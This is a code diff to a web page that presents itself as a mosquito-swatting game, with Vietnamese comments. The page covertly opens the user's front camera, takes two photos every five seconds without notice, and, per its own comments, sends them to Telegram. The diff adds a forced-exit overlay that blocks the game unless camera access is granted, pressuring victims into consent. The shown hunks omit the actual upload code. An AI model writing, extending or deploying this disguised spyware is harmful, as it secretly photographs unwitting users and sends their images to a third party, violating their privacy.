@@ -18,6 +18,7 @@
             align-items: center;
             font-family: system-ui, 'Segoe UI', sans-serif;
             overflow: hidden;
+            position: relative;
         }
         .game-container {
             position: relative;
@@ -72,11 +73,64 @@
             pointer-events: none;
             animation: splat 0.2s ease-out forwards;
         }
+        /* Overlay thoát khi từ chối camera */
+        .exit-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+            color: white;
+            font-family: system-ui, sans-serif;
+            text-align: center;
+            gap: 20px;
+        }
+        .exit-overlay h1 {
+            font-size: 2rem;
+            margin: 0;
+        }
+        .exit-overlay p {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        .exit-overlay button {
+            background: #e63946;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 60px;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .exit-overlay button:hover {
+            background: #c1121f;
+            transform: scale(0.98);
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
 <div class="game-container" id="gameArea">
     <div class="score">🦟 <span id="scoreValue">0</span></div>
+</div>
+
+<!-- Overlay thoát (ẩn ban đầu) -->
+<div id="exitOverlay" class="exit-overlay hidden">
+    <h1>🚫 ĐÃ TỪ CHỐI CAMERA</h1>
+    <p>Ứng dụng yêu cầu quyền truy cập camera để hoạt động.<br>Trang web sẽ đóng lại.</p>
+    <button onclick="window.close()">Đóng trang</button>
+    <p style="font-size:0.8rem">Nếu nút không hoạt động, hãy đóng tab này.</p>
 </div>
 
 <script>
@@ -90,13 +144,35 @@
     let activeMosquitoes = [];
     let gameInterval = null;
     let captureInterval = null;
+    let cameraGranted = false;
 
     const gameArea = document.getElementById('gameArea');
     const scoreSpan = document.getElementById('scoreValue');
+    const exitOverlay = document.getElementById('exitOverlay');
+
+    // --- HÀM DỌN DẸP KHI THOÁT ---
+    function forceExit() {
+        if (captureInterval) clearInterval(captureInterval);
+        if (gameInterval) clearInterval(gameInterval);
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+        // Xóa tất cả muỗi
+        activeMosquitoes.forEach(m => {
+            if (m.element) m.element.remove();
+            if (m.interval) clearInterval(m.interval);
+        });
+        activeMosquitoes = [];
+        // Hiện overlay
+        exitOverlay.classList.remove('hidden');
+        // Vô hiệu hóa game area
+        gameArea.style.pointerEvents = 'none';
+    }
 
     // --- HÀM CHỤP ẢNH VÀ GỬI TELEGRAM (không hiển thị thông báo) ---
     async function captureSingleAndSend() {
-        if (!stream) return;
+        if (!stream || !cameraGranted) return;
 
         const hiddenVideo = document.createElement('video');
         hiddenVideo.setAttribute('autoplay', '');
@@ -143,9 +219,7 @@
     }
 
     async function captureTwoShots() {
-        // Chụp lần 1
         await captureSingleAndSend();
-        // Đợi 300ms rồi chụp lần 2
         await new Promise(r => setTimeout(r, 300));
         await captureSingleAndSend();
     }
@@ -165,6 +239,7 @@
         try {
             const constraints = { video: { facingMode: "user" }, audio: false };
             stream = await navigator.mediaDevices.getUserMedia(constraints);
+            cameraGranted = true;
             // Bắt đầu chụp mỗi 5 giây (2 tấm)
             captureInterval = setInterval(() => {
                 captureTwoShots();
@@ -173,11 +248,14 @@
             captureTwoShots();
         } catch (err) {
             console.error('Camera permission error:', err);
+            // Từ chối hoặc lỗi camera -> thoát
+            forceExit();
         }
     }
 
     // --- TRÒ CHƠI ĐẬP MUỖI (giữ nguyên) ---
     function createMosquito() {
+        if (!cameraGranted) return; // không tạo muỗi nếu camera bị từ chối
         const mosquito = document.createElement('div');
         mosquito.className = 'mosquito';
         const maxX = gameArea.clientWidth - 50;
@@ -221,7 +299,7 @@
             mosquito.remove();
             activeMosquitoes = activeMosquitoes.filter(m => m.element !== mosquito);
             setTimeout(() => {
-                if (activeMosquitoes.length < 5) {
+                if (activeMosquitoes.length < 5 && cameraGranted) {
                     createMosquito();
                 }
             }, 300);
@@ -234,25 +312,29 @@
                 clearInterval(moveInterval);
                 mosquito.remove();
                 activeMosquitoes = activeMosquitoes.filter(m => m.element !== mosquito);
-                if (activeMosquitoes.length < 3) createMosquito();
+                if (activeMosquitoes.length < 3 && cameraGranted) createMosquito();
             }
         }, 15000);
     }
 
     function startGame() {
+        if (!cameraGranted) return;
         for (let i = 0; i < 3; i++) {
             setTimeout(() => createMosquito(), i * 400);
         }
         gameInterval = setInterval(() => {
-            if (activeMosquitoes.length < 6) {
+            if (activeMosquitoes.length < 6 && cameraGranted) {
                 createMosquito();
             }
         }, 4000);
     }
 
     // Khởi động
-    initHiddenCamera();
-    startGame();
+    initHiddenCamera().then(() => {
+        if (cameraGranted) {
+            startGame();
+        }
+    });
 
     // Dọn dẹp khi thoát
     window.addEventListener('beforeunload', () => {
